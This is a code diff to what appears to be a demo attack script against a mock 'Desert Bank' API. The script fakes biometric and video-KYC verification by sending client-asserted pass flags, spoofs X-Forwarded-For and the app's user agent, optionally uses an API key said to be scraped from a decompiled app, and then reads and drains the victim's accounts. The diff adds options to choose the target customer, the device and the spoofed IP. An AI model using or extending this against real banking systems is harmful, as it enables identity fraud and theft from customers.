@@ -24,8 +24,8 @@ def say(msg: str, delay: float = 0.0):
     time.sleep(delay)
 
 
-def login(bank: httpx.Client) -> None:
-    r = bank.post("/v2/auth/login", json={"customer_id": "C-1001", "device_id": DEVICE,
+def login(bank: httpx.Client, customer: str = "C-1001", device: str = DEVICE) -> None:
+    r = bank.post("/v2/auth/login", json={"customer_id": customer, "device_id": device,
                                           "biometric_score": 0.998, "kyc_video_passed": True})
     r.raise_for_status()
     bank.headers["Authorization"] = f"Bearer {r.json()['token']}"
@@ -52,15 +52,18 @@ def main():
     ap.add_argument("--bank", default="http://127.0.0.1:8000")
     ap.add_argument("--canary", action="store_true", help="use the API key scraped from the decompiled app")
     ap.add_argument("--pace", type=float, default=0.35)
+    ap.add_argument("--customer", default="C-1001")
+    ap.add_argument("--device", default=DEVICE)
+    ap.add_argument("--ip", default="185.220.101.47")
     a = ap.parse_args()
-    headers = {"User-Agent": "okhttp/4.9.3", "X-Forwarded-For": "185.220.101.47"}
+    headers = {"User-Agent": "okhttp/4.9.3", "X-Forwarded-For": a.ip}
     if a.canary:
         headers["X-Api-Key"] = "dsrt_live_7Hq2LmX9vB4kP0aZ"
     bank = httpx.Client(base_url=a.bank, headers=headers, timeout=30)
 
-    print(f"\n{B}{R}  TARGET: Desert Bank · customer C-1001{X}\n")
+    print(f"\n{B}{R}  TARGET: Desert Bank · customer {a.customer}{X}\n")
     say(f"{D}injecting deepfake stream into video-KYC camera feed...{X}", 1.0)
-    login(bank)
+    login(bank, a.customer, a.device)
     say(f"{G}FaceID verified ✓   KYC passed ✓   session issued{X}", 0.6)
     acc = bank.get("/v2/accounts").json()["accounts"][0]
     say(f"account {acc['id']} · balance {B}AED {acc['balance']:,.2f}{X}", 0.8)
@@ -82,7 +85,7 @@ def main():
         total, balance = total + amount, left
 
     say(f"{C}re-login from a fresh session to double-check...{X}", 0.6)
-    login(bank)
+    login(bank, a.customer, a.device)
     accounts = bank.get("/v2/accounts").json()["accounts"]
     for x in accounts:
         say(f"  {x['id']:<12} {x.get('product', 'Current'):<13} AED {x['balance']:,.2f}", 0.3)
